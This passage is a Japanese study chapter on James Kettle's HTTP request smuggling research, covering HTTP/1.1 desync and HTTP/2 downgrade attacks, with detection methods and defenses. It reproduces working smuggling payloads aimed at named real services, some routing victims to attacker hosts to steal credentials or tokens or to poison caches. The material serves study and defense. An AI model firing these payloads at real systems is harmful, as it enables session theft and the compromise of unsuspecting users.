# 第4章 James Kettle / PortSwigger Research の系譜

## (a) HTTP Desync Attacks: Request Smuggling Reborn（2019）

2019年8月、PortSwigger の James Kettle（研究部門ディレクター、ハンドル名 albinowax）が発表した "HTTP Desync Attacks: Request Smuggling Reborn" は、2005年に Watchfire の論文で理論化されながらも長らく「実務では枯れた古典」と見なされていた HTTP リクエストスマグリング（HTTP Request Smuggling）を、現代的な検出手法・攻撃手法・防御論として再構築した研究である。本節ではこの論文と、その続報 "What happened next" を軸に、なぜこの攻撃が成立するのかを仕組みレベルで解説する。

> ⚠️ 本節は防御・検出の理解を目的とする。ここで示すペイロードやリクエスト例は、脆弱性の原理を説明するための最小例であり、**実在サービスや本番環境に対する無許可の検証には使用しない**こと。検証は自分が管理する、または明示的な許可を得たラボ環境に限る。

### 核心概念:「リクエストは嘘をつく（The request is a lie）」

現代の Web サイトの多くは、単一のサーバーで完結していない。ユーザーとバックエンドの間には、**フロントエンド**（front-end。CDN、ロードバランサ、リバースプロキシ、WAF など、最初にリクエストを受ける中継サーバー）が置かれ、フロントエンドが受けたリクエストをバックエンド（back-end。実際にアプリのロジックを処理するサーバー）へ転送する構成が一般的である。

このとき性能上の理由から、フロントエンドとバックエンドの間の TCP/TLS コネクションは**使い回される（connection reuse / keep-alive）**。つまり一本のコネクションの上に、複数のユーザーのリクエストが次々と流し込まれる。ここに攻撃の土台がある。

HTTP/1.1 では「1本のバイトストリームのどこまでが1つ目のリクエストで、どこからが2つ目か」という**メッセージ境界（message boundary）**を、リクエストヘッダの記述だけで決める。フロントエンドとバックエンドがこの境界を**別々に解釈**すると、両者の間で「いま何リクエスト目を処理しているか」の同期がずれる。この同期のずれを **desync（デシンク、非同期化）** と呼ぶ。

Kettle の言葉を借りれば、攻撃者は「2つの異なる HTTP リクエストとして解釈されうる曖昧なメッセージ（ambiguous message）」を送り込む。フロントエンドは1つのリクエストとして扱って転送するが、バックエンドはそれを2つに割る。すると割られた「2つ目」の断片が、バックエンド側のコネクション上に**居残る（socket poisoning、ソケット汚染）**。そして次に同じコネクションを流れてくる**別の無関係な被害者のリクエスト**の先頭に、攻撃者が仕込んだ断片が**接頭辞（prefix）**として連結される。

これが "the request is a lie"（そのリクエストは嘘をついている）というスローガンの意味である。ネットワーク中継機器はヘッダに書かれた長さを信じて処理するが、その長さの記述自体が意図的に矛盾させられており、機器ごとに違う「真実」を信じてしまう。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### なぜ境界がずれるのか:Content-Length と Transfer-Encoding

HTTP/1.1 でボディの長さ（＝リクエストの終端）を示す方法は2つある。

- **Content-Length（CL）**: ボディのバイト数を10進数で明示する。例 `Content-Length: 15` なら、ヘッダ直後の15バイトがボディ。
- **Transfer-Encoding: chunked（TE）**: ボディを「チャンク」に分割して送る。各チャンクは「そのチャンクのバイト数を16進数で書いた行」＋CRLF＋「そのバイト数ぶんのデータ」＋CRLF で構成され、**サイズ 0 のチャンク**（`0\r\n\r\n`）が来たら本文終了、という約束になっている。

問題は、**両方のヘッダが同時に付いていた場合**の扱いである。RFC 7230 は明確に「Transfer-Encoding と Content-Length の両方を含むメッセージを受け取った場合、Content-Length は無視しなければならない（MUST be ignored）」と定めている。しかし現実には、多くのサーバーがこのルールを守らず、しかも守り方（あるいは破り方）がサーバーごとにバラバラである。ある機器は CL を優先し、別の機器は TE を優先する。この「優先順位の食い違い」こそが desync の直接原因になる。

チャンク方式の終端が `0\r\n\r\n` という**データ自身の中身**で決まる点が重要だ。CL のように「あと N バイト」と外形的に決まるのではなく、ストリームを読み進めて初めて終端がわかる。だからフロントエンドが CL を信じて「ここまで」と切ったバイト列の**続き**に、バックエンドは chunked のルールで「まだ次のリクエストがある」と読み進める余地が生まれる。

以下、代表的な3類型を見る。

#### CL.TE:フロントは Content-Length、バックは Transfer-Encoding

フロントエンドが CL を優先し、バックエンドが TE を優先するケース。論文の検出用リクエスト例:

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

**なぜこうなるか。** フロントエンドは `Content-Length: 4` を信じる。ヘッダ直後のボディは `1\r\nZ\r\n` のうち先頭4バイト（`1`, CR, LF, `Z`）ちょうどでリクエストが終わると判断し、そこまでをバックエンドへ転送する。一方バックエンドは `Transfer-Encoding: chunked` を優先するので、`1\r\n` を「これから1バイトのチャンクが来る」と読み、`Z` を受け取る。次に**チャンクの区切りとして次のチャンクサイズ行を待つ**が、そこにあるはずの `Q` はまだフロントエンドから送られてこない（フロントは4バイトで切ったため）。結果、バックエンドは「次のチャンクサイズ」を待って**タイムアウトするまでブロックする**。

この「バックエンドだけが待ち続けて応答が遅れる」現象が、**副作用のないタイミングベース検出（timing-based detection）**の核心である。被害者のリクエストを実際に壊すことなく、応答遅延の有無だけで CL.TE の存在を推定できる。

#### TE.CL:フロントは Transfer-Encoding、バックは Content-Length

逆に、フロントが TE、バックが CL を優先するケース。検出例:

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0
X
```

**なぜこうなるか。** フロントエンドは chunked を優先し、`0\r\n` を見て「サイズ0のチャンク＝本文終了」と判断する。つまり `0\r\n\r\n` までで転送を打ち切り、後続の `X` は送らない（あるいは次リクエストの一部として扱う）。バックエンドは `Content-Length: 6` を信じているので、ボディを6バイト（`0`, CR, LF, `X`, さらに続く2バイト…）受け取ろうとするが、フロントが `X` の手前で止めているため**6バイトに満たない**。よってバックエンドは残りのバイトを待ってタイムアウトする。

CL.TE とはタイムアウトを起こす仕掛けが左右逆になっている点に注目してほしい。検出時は両パターンを試し、どちらで遅延が出るかで desync の向きを判定する。

#### TE.TE:双方が chunked を解釈するが、解釈が食い違う

フロントもバックも Transfer-Encoding を解釈するものの、片方だけがヘッダを「無効化」してしまうよう仕向ける類型。攻撃者は Transfer-Encoding ヘッダをわざと**難読化（obfuscation）**し、片方のパーサには「これは TE だ」と認識させ、もう片方には「壊れた／未知のヘッダだから無視」と扱わせる。論文が挙げる難読化バリエーション:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked      ← コロンの前にスペース
Transfer-Encoding:[tab]chunked   ← 値の前がタブ文字
Transfer-Encoding
 : chunked                        ← 行折り返し（後の続報で $16,500 の報奨につながる)
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: chunked        ← 実体は正しい行と難読化行を並べ、片方だけ効かせる
Transfer-Encoding: x
```

**なぜこうなるか。** HTTP パーサの実装は、規格の隙間で挙動が分かれる。たとえば「コロンの前にスペース」を厳密に不正として拒否するパーサもあれば、寛容に読み飛ばして `Transfer-Encoding` として受理するパーサもある。タブ文字・先頭のヌルバイト・大文字小文字・前方一致など、実装ごとの「甘さ」の差を突いて、**同一のバイト列を2台に別々に解釈させる**。TE.TE は要するに CL.TE か TE.CL のどちらかに落とし込むための「TE を片側で殺す」テクニックの集合である。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 検出から確証へ:Detect → Confirm → Explore → Attack

Kettle の方法論は4段階からなる。

1. **Detect（検出）**: 上記のタイミングベース検出。応答遅延の有無で desync の有無と向きを、被害者に影響を与えずに推定する。
2. **Confirm（確証）**: 実際に「汚染リクエスト」を送り、続けて**自分自身の**通常リクエストを同じエンドポイントへ送る。汚染が効いていれば、続く自分のリクエストが不自然な応答（本来 200 のはずが 404 など）を返す。これでソケット汚染を再現性をもって確認する。
3. **Explore（探索）**: 内部ヘッダの漏洩などで環境を調べる。
4. **Attack（攻撃／影響実証）**: ストレージ機能を悪用した被害者リクエストの捕捉、キャッシュ汚染など。

確証段階の CL.TE ペイロード例（論文より）:

```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: b
```

**なぜこうなるか。** `Transfer-Encoding: zchunked` は TE.TE 難読化で、フロントには無効ヘッダと見せて CL を使わせ（53バイトで区切らせ）、バックには chunked として効かせる。バックは `17`（16進で23バイト）のチャンク `=x&q=smuggling&x=` を読み、次に `0\r\n\r\n` で本文終了とみなす。その**後ろに残った** `GET /404 HTTP/1.1\r\nFoo: b` がバックエンドのソケットに居残り、次に来る被害者リクエスト（例:別ユーザーの `POST /search ...`）の先頭に連結される。連結後は `Foo: bPOST /search ...` のような形になり、被害者は狙った通り 404 応答などを受け取る——これが汚染が効いた証拠になる。

#### 内部ヘッダの漏洩

反射（reflection。入力値をそのまま応答に出す挙動）のあるエンドポイントを使い、Content-Length を長めに設定して被害者リクエストの続きを「巻き込んで」反射させると、フロントエンドがバックエンドへ追加する内部ヘッダ（`X-Forwarded-For`、`X-Forwarded-Proto` など、プロキシが付与する送信元情報）を丸ごと読み出せる。論文では New Relic に対し、この手法で内部専用ヘッダを発見し、それを悪用して**内部 API への完全な管理者権限アクセス**にまで至った事例が示されている（F5 ゲートウェイが該当し、後述の F5 アドバイザリにつながった）。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 攻撃インパクト:何が起きるのか

リクエストスマグリングの怖さは、単一の脆弱性でありながら派生する影響が広いことにある。

#### フロントエンドの防御を迂回する

WAF やアクセス制御はフロントエンドに置かれることが多い。スマグリングで「フロントを1リクエストとして通過させ、バック側で別リクエストに割る」と、割られた2つ目のリクエストは**フロントの検査を素通り**する。これにより本来ブロックされる内部エンドポイントやバックエンド API に到達できる。

#### 他人のリクエストを捕捉する（クレデンシャル窃取）

保存機能（掲示板の投稿、プロフィール更新など、入力を保存し後で表示する機能）を悪用する。攻撃者は被害者リクエストの先頭に「これを保存せよ」という接頭辞を仕込む。被害者の Cookie や認証ヘッダを含んだリクエスト全体がアプリに保存され、攻撃者が後からそれを読み出す。論文の Trello の例:

```
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

9f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

x=x&csrf=1234&username=testzzz&bio=cake
0
```

**なぜこうなるか。** タブ難読化した TE でバック側だけ chunked を効かせ、被害者のリクエストを `bio`（自己紹介欄）という保存フィールドの値として巻き込む。Content-Length を大きく（400）取ることで、被害者リクエストの続き——認証済み Cookie を含む部分——まで `bio` の中に取り込ませ、攻撃者は被害者のプロフィールを見るだけでそのセッション情報を回収できる。

#### 反射型 XSS を「大量配信型」に格上げする

通常の反射型 XSS は、被害者に細工リンクを踏ませる必要がある。しかしスマグリングを使うと、攻撃者が仕込んだ XSS を含む応答を、**いま普通にサイトを閲覧しているランダムな利用者**に配信できる。ユーザー操作を要さない大量搾取（mass-exploitation）が成立し、深刻度が大きく跳ね上がる。

#### Web キャッシュ汚染（Web Cache Poisoning）

スマグリングで汚染した応答を、CDN/キャッシュが「正規のリソースへの応答」として保存すると、以後**全ユーザー**に汚染応答が配られる。論文の代表事例は PayPal で、`c.paypal.com` 上の JavaScript ファイル `.../fb-all-prod.pp2.min.js` を乗っ取った:

```
POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /webstatic HTTP/1.1
Host: skeletonscribe.net?
X: X
```

**なぜこうなるか。** 汚染応答が本物のログインページ用 JS のキャッシュキーに紐づけて保存されると、ログインしようとする全ユーザーが攻撃者の制御下の JS を実行してしまう。論文ではこれを DOM ベースのオープンリダイレクトや CSP 迂回と連鎖させ、平文パスワードの窃取に至った。この報告に対し PayPal は初報で **$18,900**、行折り返しヘッダを使った回避策（bypass）の発見に対しさらに **$20,000** を支払った。

#### Web キャッシュ・デセプション++

被害者の Cookie 付きでサーバーに機微データを取得させ、その応答を静的リソースのキャッシュに書かせる変種。攻撃者は無操作の被害者のアカウント情報を、後からキャッシュ経由で取得できる。

論文全体で報告された報奨総額は **7万ドル超**とされる。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### ツール:HTTP Request Smuggler と Turbo Intruder

この研究の実務的インパクトを支えたのが、公開されたオープンソースツール群である。

- **HTTP Request Smuggler**（Burp Suite 拡張）: 上記のタイミング検出、TE.TE 難読化バリエーションの総当たり、確証手順を自動化する。「最小の巻き添えリスク（minimal risk of collateral damage）」で検出できることを重視した設計。
- **Turbo Intruder**: 高速・高並列にリクエストを送るツールで、コネクション使い回しの挙動観察やタイミング計測に使う。

検出・確証を安全に回すための実務上の注意点として、論文および続報は次を挙げる。

- **多くの Web テストツールは Content-Length を自動修正してしまう**ため、スマグリングは送れない。Burp Repeater では「Content-Length を自動更新しない」オプションを無効化して手動制御する必要がある。
- Turbo Intruder では `requestsPerConnection = 1` に設定し、汚染リクエストと被害者役リクエストを対にして送る。
- ホスト名解決やSOCKSプロキシ経由の別IPからのアクセスで、フロントエンドが複数台あるか・コネクション使い回しが本当に起きるかを確認する。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 続報「What happened next」:ベンダ対応と新バリアント

初報後の続報 "HTTP Desync Attacks: what happened next" では、影響範囲の広さとベンダ各社の対応、そして新たな難読化手法が報告された。バージョン・時期依存の情報なので、修正状況を明記する。

**ベンダ対応（2019年〜）**

- **Akamai**: 公表から約48時間でホットフィックスを展開。RFC 7230 準拠（chunked の Transfer-Encoding を優先）に寄せ、同社配下の多数のサイトを保護。
- **F5**: アドバイザリ **K50375550**（2019年8月25日）を発行。BIG-IP に対しプロトコル準拠の強制を最も確実な緩和策として推奨。
- **HAProxy**: バージョン **2.0.6** で修正（垂直タブ〔vertical tab〕を使う難読化を正規化できていなかった点への対処）。
- **Golang**: `net/http` ライブラリの脆弱性として **CVE-2019-16276** を採番・修正。

**新たな難読化・検出手法**

- **Transfer-Encoding 値の前方一致の甘さ**: あるパーサ（例として Suricata）は、`chu` のような**途中までの値でも chunked と解釈**してしまう。更新版 HTTP Request Smuggler の "lazygrep" 技法はこの甘さを突く。
- **ヌルバイト注入**: `Transfer-Encoding: \x00chunked`。
- **余分なキャリッジリターン（superfluous CR）**: `Foo: bar\r\n\rTransfer-Encoding: chunked` のように、行の途中に単独の CR を混ぜて片側のパーサだけヘッダ境界を誤認させる。この手法は **$16,500** の報奨につながり、広範な脆弱性を露呈させた。

**ツール改良（v1.02）**: 「Only report exploitable（実際に悪用可能なものだけ報告）」で誤検出を削減、「Risky mode」で精度向上（ただしリクエストが落ちる可能性あり）、CL.TE の所見にトリアージ高速化用の追加リクエストを添付、など。

> 出典: HTTP Desync Attacks: what happened next — https://portswigger.net/research/http-desync-attacks-what-happened-next

### 防御:何をすればスマグリングは止まるのか

論文が示す防御は、いずれも「フロントとバックの解釈を一致させる／曖昧さを排除する」という一点に収斂する。

- **曖昧なリクエストの正規化（normalize）**: フロントエンドが、転送前に矛盾したリクエストを一意な形へ整える。Cloudflare や Fastly はこの正規化に成功している例として挙げられる。
- **曖昧なリクエストの拒否とコネクション切断**: バックエンドは CL と TE が両立するリクエストや、難読化された TE を**拒否し、そのコネクションを落とす**。PayPal の対策は、Akamai 側で `Transfer-Encoding: chunked` を含むリクエストを一律拒否する構成だった。
- **チェーン全体で同一のサーバーソフト・同一設定を使う**: 解釈の食い違いそのものを無くす。
- **バックエンド・コネクションの使い回しを無効化する**: 汚染断片が次のリクエストに連結される前提を崩す（性能とのトレードオフあり）。
- **バックエンド通信を HTTP/2 に統一する**: 後の研究（HTTP/2 の悪用）で完全な万能薬ではないと判明するが、HTTP/2 のバイナリフレーミングはメッセージ長を明示的に扱うため、HTTP/1.1 の CL/TE 曖昧性の多くを構造的に排除する。

**評価・検証時の注意**: Squid などの監視プロキシがスマグリングを途中で「矯正」してしまい、テストの網羅性を下げることがある。評価環境そのものが結果を歪め得る点に留意する。

> 出典: HTTP Desync Attacks: what happened next — https://portswigger.net/research/http-desync-attacks-what-happened-next

### 位置づけ:過去の系譜との接続（CWE/CAPEC）

> ⚠️ **未取得の資料**: 「HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques（CWE Program, Medium）」は自動取得できませんでした（理由: HTTP 403 Forbidden。Medium の bot 遮断による）。以下のURLからご自身で直接ご覧ください: https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1

（以下は未取得資料の補足として一般知識および検索結果に基づく解説です。）

CWE Program によるこの解説記事は、Kettle の2019年研究を「新発明」ではなく**既存の攻撃系譜の再興（redux / reborn）**として位置づける点に価値がある。HTTP Desync は「HTTP チェーン上の各エージェントが、連続する HTTP メッセージの長さ・境界の解釈で食い違うよう、ヘッダ・リクエストライン・ボディを操作すること」と定義され、標準的な脆弱性・攻撃の分類体系では次のように整理される。

- **CWE-444: Inconsistent Interpretation of HTTP Requests（'HTTP Request/Response Smuggling'）** — 本脆弱性クラスそのものを表す CWE 識別子。「HTTP リクエストの一貫しない解釈」という名称が、本節で述べた desync の本質（＝解釈の食い違い）をそのまま言い当てている。
- **CAPEC-33: HTTP Request Smuggling** — リクエストスマグリングの攻撃パターン。
- **CAPEC-273: HTTP Response Smuggling** — 応答側のスマグリング。
- **CAPEC-105: HTTP Request Splitting / CAPEC-34: HTTP Response Splitting** — 「スプリッティング」系。スマグリングが「境界の食い違いを突いて隠しリクエストを密輸する」のに対し、スプリッティングは主に CRLF 注入で1つのメッセージを2つに割る古典的手法で、両者は近縁だが別物である。

この分類の理解は実務上も重要だ。Kettle 研究は CAPEC-33（Request Smuggling）を現代のプロキシ／CDN 構成で復権させたものであり、2005年 Watchfire 論文（CL/TE 混在の理論化）や、それ以前の CRLF 注入によるレスポンス・スプリッティングの延長線上にある。「新しい脆弱性」ではなく「古い脆弱性が、コネクション使い回しを多用する現代アーキテクチャで再び致命的になった」というのが、この系譜整理の核心である。

> 出典: HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques（CWE Program, Medium。本文は未取得、CWE/CAPEC の公式定義に基づき補足）— https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1

### 本節のまとめ

- HTTP/1.1 のメッセージ境界は Content-Length と Transfer-Encoding で決まり、両者が矛盾したときの扱いがサーバーごとに違うことが desync の根本原因。
- フロントとバックの解釈のズレ＋コネクション使い回しにより、攻撃者の断片が**他人のリクエスト**に接頭辞として連結される（socket poisoning）。
- 類型は **CL.TE / TE.CL / TE.TE**。検出は被害者に影響を与えない**タイミングベース**で行い、Detect→Confirm→Explore→Attack と進める。
- 影響は WAF 迂回、他人のクレデンシャル窃取、反射型 XSS の大量配信化、Web キャッシュ汚染など多岐にわたる。
- 防御の本質は「解釈の一致」と「曖昧なリクエストの拒否・正規化」、そして必要に応じたバックエンド・コネクション使い回しの停止。
- この研究は CWE-444 / CAPEC-33 として体系化された古典の再興であり、現代アーキテクチャでの再評価が要点。

## (b) HTTP/2: The Sequel is Always Worse（2021）本文とスライド

James Kettle が 2019 年の "HTTP Desync Attacks" で HTTP/1.1 のリクエストスマグリング（1本のTCP接続に流れる複数リクエストの「境界」を、前段サーバと後段サーバで食い違わせる攻撃）を体系化した続編が、2021 年の "HTTP/2: The Sequel is Always Worse"（続編はいつだって前作より酷い）である。本節では PortSwigger の本文記事、同内容のホワイトペーパー PDF、および Black Hat USA 2021 のスライドを突き合わせ、HTTP/2 環境で新しく生まれたデシンク（desync = 前段・後段の境界認識のズレ）の仕組みを、なぜそうなるのかというプロトコル・パーサレベルの原理から解説する。

このリサーチが業界に与えた衝撃を一言で言えば、「HTTP/2 は仕様上はリクエスト境界が曖昧にならないはずなのに、現実のインフラの大半が HTTP/2 を内部で HTTP/1.1 に翻訳（ダウングレード）していたため、その翻訳の瞬間に旧来のスマグリングが復活し、しかも HTTP/2 のバイナリ形式ゆえに HTTP/1.1 より強力な攻撃部品が手に入った」ということである。

> ⚠️ **未取得の資料**: 3つの担当URLはいずれも取得を試み、本文記事はHTML本文として、スライドPDFとホワイトペーパーPDFはローカル保存されたバイナリからテキスト抽出して内容を確認できました。ホワイトペーパー（`http2whitepaper.pdf`）はスライド末尾の "Whitepaper: https://portswigger.net/research/http2" が示すとおり、本文記事と実質同一内容のため、本文記事とスライドから統合して記述しています。取得不可の資料はありません。

---

### なぜ HTTP/2 で境界のズレが「復活」するのか — ダウングレードという前提

HTTP/1.1 では、ボディの長さの決め方が2通りあった。`Content-Length`（バイト数を数える）と `Transfer-Encoding: chunked`（`0\r\n\r\n` という終端マーカーが来るまで読む）である。この2つを前段と後段が別々に信じてしまうと境界がズレる。これが古典的な **CL.TE / TE.CL** スマグリングだった。

HTTP/2 は設計思想からしてこの問題を消したはずだった。HTTP/2 はテキストではなく**バイナリのフレーム**でメッセージを運び、各 DATA フレームには**長さフィールドが組み込まれている**。つまりボディの長さはフレームの構造そのものから一意に決まり、`Content-Length` や `Transfer-Encoding` に頼る必要がない。仕様上、HTTP/2 リクエストの境界は曖昧になり得ない。

ではなぜスマグリングが起きるのか。答えは **HTTP/2 ダウングレード（downgrade）** にある。多くの CDN・ロードバランサ・WAF は、クライアントとは HTTP/2 で会話するが、内部（バックエンド）へは古い HTTP/1.1 に**翻訳し直して**転送している。この翻訳の瞬間、HTTP/2 の明快なフレーム境界情報は捨てられ、前段は改めて `Content-Length` などの HTTP/1.1 のヘッダを組み立てて後段に渡す。ここで前段の「長さ判定」と後段の「長さ判定」がズレれば、古典的スマグリングがそっくり復活する。

スライド冒頭の対比図がこの構造を端的に示している。HTTP/1.1 では `POST /login HTTP/1.1\r\nHost: ...\r\nContent-Length: 9\r\n\r\nx=123&y=4` というテキストの並びが、HTTP/2 では StreamID ごとに `:method POST` `:path /login` `:authority psres.net` という**擬似ヘッダ（pseudo-header、`:` で始まる特別なヘッダで、HTTP/1.1 のリクエストラインを分解して表現したもの）** とヘッダ、DATA に構造化される。

したがって、HTTP/2 世界のスマグリングは古典の CL.TE / TE.CL に対応させて **H2.CL / H2.TE** と呼ぶ。「H2」は前段が HTTP/2 で受けたことを、「.CL / .TE」は後段への翻訳後に食い違いを起こす原因ヘッダを表す。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2
> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### H2.CL デシンク — Content-Length を検証せずダウングレードする（Netflix / CVE-2021-21295）

HTTP/2 リクエストにも、クライアントは（無意味なはずの）`content-length` ヘッダを添えることができる。仕様上、この値は DATA フレームの実際の長さと一致していなければならず、一致しない場合はサーバが拒否すべきである。しかし前段がこの検証を怠り、**クライアントが申告した `content-length` の値をそのまま HTTP/1.1 に書き写して**しまうと問題が起きる。

Netflix（Zuul/Netty 構成、CVE-2021-21295、報奨金 $20,000）の実例：

```
（攻撃者が送る HTTP/2 リクエスト）
:method   POST
:path     /n
:authority www.netflix.com
content-length  4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

前段はこれを次のように HTTP/1.1 へダウングレードする：

```
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: barGET /anything HTTP/1.1
Host: www.netflix.com
```

**なぜ攻撃が成立するのか。** DATA フレームには本当は `abcdGET /n HTTP/1.1...` という長いボディが入っているが、前段はクライアントの申告した `content-length: 4` を無検証で信じ、その `4` をそのまま後段へ渡す。後段は「ボディは4バイト（`abcd`）だ」と判断してそこで最初のリクエストを打ち切り、続く `GET /n HTTP/1.1\r\nHost: 02.rs?x.netflix.com...` を**次の新しいリクエスト**として解釈してしまう。この密輸された（smuggled）リクエストが、被害者の後続リクエストの先頭に接着され、`Location: https://02.rs?x.netflix.com/n` へのリダイレクトを注入する。これにより後続ユーザを攻撃者のドメインへ誘導できる。

ポイントは、HTTP/2 側の DATA の実長と、翻訳後 HTTP/1.1 の `Content-Length` が食い違うこと。前段が「HTTP/2 の `content-length` は実際のフレーム長と一致するか」を検証していれば防げた。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### H2.TE デシンク — 接続固有ヘッダ Transfer-Encoding を通してしまう（AWS ALB / Imperva / AOL）

HTTP/2 の RFC（RFC 7540、後継 RFC 9113）は明確にこう定めている：

> 接続固有のヘッダフィールド（connection-specific header fields）を含むメッセージは malformed（不正）として扱わなければならない（MUST）。

`Transfer-Encoding` は HTTP/1.1 の1ホップ（隣接接続）限りの接続固有ヘッダなので、HTTP/2 リクエストに含まれていたら前段は拒否しなければならない。ところが、前段がこの `transfer-encoding` を**拒否も削除もせず、そのままダウングレード後の HTTP/1.1 に書き写して**しまう実装があった。

AWS Application Load Balancer + Imperva（Incapsula）WAF 経由の Verizon/oath.com の例（+$7,000 相当、累計 $27,000）：

```
（HTTP/2）
:method   POST
:path     /identity/XUI
:authority id.b2b.oath.com
transfer-encoding  chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10

x=
```

ダウングレード後：

```
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked

0

GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10

x=（この後ろに被害者のリクエストが接着される）
```

**なぜ成立するのか。** 前段は HTTP/2 のフレーム長でボディ全体（`0\r\n\r\nGET /oops...x=`）を受け取り、ダウングレード時に `Content-Length` と `Transfer-Encoding: chunked` の**両方**を付けてしまう。後段は HTTP/1.1 のルールに従い `Transfer-Encoding: chunked` を優先し、チャンク終端マーカー `0\r\n\r\n` でボディが終わったと判断する。すると、その後ろの `GET /oops HTTP/1.1...` が**別のリクエスト**になる。攻撃者はこの密輸リクエストの末尾を `x=`（値が未完のパラメータ）で終わらせておくことで、被害者の本物のリクエスト全体を `x=GET /?…&code=secret HTTP/1.1...` のようにパラメータ値へ飲み込ませ、その内容（OAuth の `code` や `Referer` に含まれる認可トークン）を攻撃者側へ反射させて窃取する。

**ヘッダ丸ごと窃取（Header hijack、AOL、+$10,000、累計 $37,000）。** 同じ H2.TE を使い、密輸したリクエストの直後に `OPTIONS / HTTP/1.1` と `Access-Control-Request-Headers: authorization` を仕込むと、被害者の `Authorization: Bearer eyJ...` ヘッダを CORS 応答経由で反射させ、生の認証トークンを盗み出せた。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### H2.TE をヘッダ値へのCRLF注入で作り出す（Netlify CDN / start.mozilla.org）

前段が「`transfer-encoding` という名前のヘッダ」を弾くようになっても、まだ抜け道がある。**ヘッダ値の中に改行を注入する**手口だ。

HTTP/1.1 では、ヘッダ値に生の `\r\n`（CR LF）を入れることは構文上不可能だった（`\r\n` はヘッダの区切りそのものだから）。ところが HTTP/2 はバイナリ形式なので、ヘッダ値の中に `\r` や `\n` を含むバイト列を**そのまま格納できてしまう**。RFC は「ヘッダ値に許されない文字を含むリクエストは malformed として扱え」と要求しているが、これを検証しない前段があった。

Netlify CDN の例（start.mozilla.org に影響、+$4,000、累計 $41,000）：

```
（HTTP/2、foo ヘッダの値に \r\n を埋め込む）
:method   POST
:authority start.mozilla.org
:path     /
foo       b\r\n
          transfer-encoding: chunked
（DATA）
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
```

ダウングレード後、`foo` ヘッダの値に埋め込んだ `\r\n` が本物の改行として展開され、`Transfer-Encoding: chunked` が独立したヘッダとして注入される：

```
POST / HTTP/1.1
Host: start.mozilla.org
Foo: b
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: evil-netlify-domain
Content-Length: 5

x=（この後ろに被害者リクエスト）
```

**なぜ成立するのか。** 前段は `foo` の値を単なる文字列として HTTP/1.1 に書き戻すが、その値に含まれる `\r\n` が改行として機能し、実質的に新しい `Transfer-Encoding: chunked` ヘッダを密輸する。以降は H2.TE と同じ原理で境界がズレる。Netlify のケースではこれをキャッシュ汚染（cache poisoning）に発展させ、Kettle の言葉を借りれば「Netlify CDN 上のあらゆるサイトのあらゆるページを完全に制御」できた。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### H2.X リクエストスプリッティング — 完全な二重CRLFで「2本のリクエスト」に割る（Atlassian Jira）

`Transfer-Encoding` を密輸する代わりに、ヘッダ値へ **`\r\n\r\n`（二重CRLF、ヘッダ部の終わりを示すマーカー）** を注入すると、そこで最初のリクエストがヘッダもボディも含めて完結し、続く部分が**まるごと独立した第2のリクエスト**になる。これがリクエストスプリッティング（request splitting）で、CL/TE のどちらに依存するかを問わないため **H2.X** と表記する。

Atlassian（ecosystem.atlassian.net、PulseSecure VTM 由来、SA44790、報奨金 $15,000）：

```
（HTTP/2）
:method   GET
:authority eco.atlassian.net
foo       bar\r\n
          Host: eco.atlassian.net\r\n
          \r\n
          GET /robots.txt HTTP/1.1\r\n
          X-Ignore: x
```

ダウングレード後：

```
GET / HTTP/1.1
Foo: bar
Host: eco.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x
Host: eco.atlassian.net
```

